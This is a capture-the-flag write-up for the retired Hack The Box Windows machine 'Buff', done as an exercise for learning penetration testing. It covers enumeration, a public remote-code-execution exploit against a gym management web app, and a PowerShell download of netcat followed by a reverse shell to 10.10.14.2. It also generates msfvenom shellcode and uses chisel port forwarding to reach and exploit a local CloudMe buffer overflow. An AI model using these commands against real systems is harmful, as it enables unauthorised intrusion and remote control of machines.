---
title: "HTB Buff Writeup"
date: 2023-07-07
tags: ["CTF","Security"]
description: "Fun with chisel and Windows"
draft: false
type: page
---


# HTB "Buff" Writeup

"Buff" is an easy windows box that has been retired. It had a nice exploit from some outdated software for the initial access and required some port forwarding trickery for the privesc.


## Enumeration

We can start with nmap.

```bash
[~/htb/buff]$ nmap -p- -Pn 10.10.10.198
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-06 19:36 EDT
Nmap scan report for 10.10.10.198
Host is up (0.033s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE
7680/tcp open  pando-pub
8080/tcp open  http-proxy
```

7680 is not a port that I recognize here.

Moving on, to full service detection and scripts.

```bash
[~/htb/buff]$ nmap -sC -sV -p7680,8080 -Pn 10.10.10.198
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-06 19:39 EDT
Nmap scan report for 10.10.10.198
Host is up (0.030s latency).

PORT     STATE SERVICE    VERSION
7680/tcp open  pando-pub?
8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n's Bro Hut
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
``` 

This doesn't tell us much as I know from prior experience none of these service versions are really going to be vulnerable.


Browsing to the page, and looking around, we can find a footnote that says `Gym Management Software 1.0`.

Doing a `searchsploit "gym managment"`, provides us with an RCE exploit!

```bash
[Gym Management System 1.0 - Unauthenticated Remot | php/webapps/48506.py](<[~/htb/buff]$ searchsploit gym
-------------------------------------------------- ---------------------------------
 Exploit Title                                    |  Path
-------------------------------------------------- ---------------------------------
Gym Management System 1.0 - 'id' SQL Injection    | php/webapps/48936.txt
Gym Management System 1.0 - Authentication Bypass | php/webapps/48940.txt
Gym Management System 1.0 - Stored Cross Site Scr | php/webapps/48941.txt
Gym Management System 1.0 - Unauthenticated Remot | php/webapps/48506.py
WordPress Plugin WPGYM - SQL Injection            | php/webapps/42801.txt
-------------------------------------------------- --------------------------------->)
```

## Foothold

Running this script as `python 48506.py http://10.10.10.198:8080/` gives us a web shell. We can't do much here, so we will want to pivot out.

Something was killing payloads generated by msfvenom (defender was turned on I later learned). I also had trouble using certutil to upload so I used powershell and a simple nc.exe shell.

```cmd
powershell -c Invoke-WebRequest -Uri http://10.10.14.2/nc.exe -OutFile nc.exe
nc.exe -e cmd.exe 10.10.14.2 4444
```


## Privesc

From here I went through the gauntlet of searching for the proper privesc vector including starting with winpeas.

```cmd
powershell -c Invoke-WebRequest -Uri http://10.10.14.2/winPEASx64.exe -OutFile peas.exe
```

Turns out in our user, shauns, download folder there is an executable called `cloudme_1112.exe` additional enumeration through `tasklist` and `netstat` shows there is a process running internally on port 8888.

```cmd
netstat -ano | findstr TCP | findstr ":0" - find the pid
tasklist /v | findstr 2820
```

```cmd
TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING       6952
```

```cmd
  TCP        127.0.0.1             8888          0.0.0.0               0               Listening         3992            CloudMe
```

A searchsploit on cloudme revealed a remote buffer overflow.

```bash
[~/htb/buff]$ searchsploit cloudme
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                        |  Path
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
CloudMe 1.11.2 - Buffer Overflow (PoC)                                                                                                | windows/remote/48389.py
CloudMe 1.11.2 - Buffer Overflow (SEH_DEP_ASLR)                                                                                       | windows/local/48499.txt
CloudMe 1.11.2 - Buffer Overflow ROP (DEP_ASLR)                                                                                       | windows/local/48840.py
Cloudme 1.9 - Buffer Overflow (DEP) (Metasploit)                                                                                      | windows_x86-64/remote/45197.rb
CloudMe Sync 1.10.9 - Buffer Overflow (SEH)(DEP Bypass)                                                                               | windows_x86-64/local/45159.py
CloudMe Sync 1.10.9 - Stack-Based Buffer Overflow (Metasploit)                                                                        | windows/remote/44175.rb
CloudMe Sync 1.11.0 - Local Buffer Overflow                                                                                           | windows/local/44470.py
CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt                                                                                       | windows/remote/46218.py
CloudMe Sync 1.11.2 Buffer Overflow - WoW64 (DEP Bypass)                                                                              | windows_x86-64/remote/46250.py
CloudMe Sync < 1.11.0 - Buffer Overflow                                                                                               | windows/remote/44027.py
CloudMe Sync < 1.11.0 - Buffer Overflow (SEH) (DEP Bypass)                                                                            | windows_x86-64/remote/44784.py
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------

```

To run this properly we need to generate shell code like so:

```bash 
 msfvenom -p windows/exec CMD="c:\Users\shaun\Downloads\nc.exe -e cmd.exe 10.10.14.2 4444" -b '\x00\x0A\x0D' -f python -v payload
```

I uploaded netcat again to make sure my payload would not be borked.

And finally, what to do about the port only running internally?

We can chisel it out!

Start a listener on our machine:

```bash
./chisel server -p 1080 --reverse
```

Run the client on the compromised machine:

```cmd
.\chisel.exe client 10.10.14.2:1080 R:8888:127.0.0.1:8888
```

Then we can run our exploit with the shellcode that we generated dropped in and we are good to go.
